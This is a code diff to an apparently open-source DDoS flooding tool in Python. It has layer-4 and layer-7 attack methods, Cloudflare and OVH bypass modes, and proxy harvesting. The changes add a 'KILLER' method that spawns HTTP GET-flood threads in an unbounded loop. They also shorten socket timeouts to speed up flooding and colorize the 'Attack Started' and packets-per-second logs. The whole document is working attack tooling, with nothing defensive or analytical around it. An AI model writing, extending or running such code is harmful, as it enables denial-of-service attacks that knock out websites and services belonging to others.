@@ -67,10 +67,24 @@ def getMyIPAddress():
         __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
     return getMyIPAddress()
 
+  
+  
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
 
 def exit(*message):
     if message:
-        logger.error(" ".join(message))
+        logger.error(bcolors.FAIL +" ".join(message) + bcolors.RESET)
     shutdown()
     _exit(1)
 
@@ -79,7 +93,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER"
     }
 
     LAYER4_METHODS: Set[str] = {
@@ -284,7 +298,7 @@ class Layer4(Thread):
         else:
             s = socket(conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        s.settimeout(60)
+        s.settimeout(.9)
         s.connect(self._target)
         return s
 
@@ -591,7 +605,7 @@ class HttpFlood(Thread):
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(60)
+        sock.settimeout(.9)
         sock.connect(self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -689,6 +703,10 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 Tools.send(s, self._defaultpayload)
         Tools.safe_close(s)
+
+    def KILLER(self) -> None:
+        while True:
+            Thread(target=self.GET, daemon=True).start()
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
@@ -969,6 +987,7 @@ class HttpFlood(Thread):
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
+        if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
 class ProxyManager:
@@ -979,7 +998,7 @@ class ProxyManager:
             provider for provider in cf["proxy-providers"]
             if provider["type"] == Proxy_type or Proxy_type == 0
         ]
-        logger.info("Downloading Proxies form %d Providers" % len(providrs))
+        logger.info(f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(providrs))
         proxes: Set[Proxy] = set()
 
         with ThreadPoolExecutor(len(providrs)) as executor:
@@ -997,7 +1016,7 @@ class ProxyManager:
     @staticmethod
     def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
         logger.debug(
-            "Downloading Proxies form (URL: %s, Type: %s, Timeout: %d)" %
+            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
             (provider["url"], proxy_type.name, provider["timeout"]))
         proxes: Set[Proxy] = set()
         with suppress(TimeoutError, exceptions.ConnectionError,
@@ -1275,12 +1294,12 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
     if proxy_ty == 6:
         proxy_ty = randchoice([4, 5, 1])
     if not proxy_li.exists():
-        logger.warning("The file doesn't exist, creating files and downloading proxies.")
+        logger.warning(f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
         with proxy_li.open("w") as wr:
             Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
             logger.info(
-                f"{len(Proxies):,} Proxies are getting checked, this may take awhile!"
+                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
             )
             Proxies = ProxyChecker.checkAll(
                 Proxies, timeout=1, threads=threads,
@@ -1299,10 +1318,10 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
     proxies = ProxyUtiles.readFromFile(proxy_li)
     if proxies:
-        logger.info(f"Proxy Count: {len(proxies):,}")
+        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
     else:
         logger.info(
-            "Empty Proxy File, running flood witout proxy")
+            f"{bcolors.WARNING}Empty Proxy File, running flood witout proxy{bcolors.RESET}")
         proxies = None
 
     return proxies
@@ -1324,6 +1343,7 @@ if __name__ == '__main__':
 
                 method = one
                 host = None
+                port= None
                 url = None
                 event = Event()
                 event.clear()
@@ -1447,15 +1467,18 @@ if __name__ == '__main__':
                                proxies).start()
 
                 logger.info(
-                    "Attack Started to %s with %s method for %s seconds, threads: %d!"
-                    % (target or url.human_repr(), method, timer, threads))
+                    f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
+                    % (target or url.host, method, timer, threads))
                 event.set()
                 ts = time()
                 while time() < ts + timer:
-                    logger.debug('PPS: %s, BPS: %s / %d%%' %
-                                 (Tools.humanformat(int(REQUESTS_SENT)),
+                    logger.debug(f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
+                                 (target or url.host,
+                                  port or (url.port or 80),
+                                  method,
+                                  Tools.humanformat(int(REQUESTS_SENT)),
                                   Tools.humanbytes(int(BYTES_SEND)),
-                                  round((time() - ts) / timer * 100, 2)))
+                                  round((time() - ts) / timer * 100, 2)))  
                     REQUESTS_SENT.set(0)
                     BYTES_SEND.set(0)
                     sleep(1)
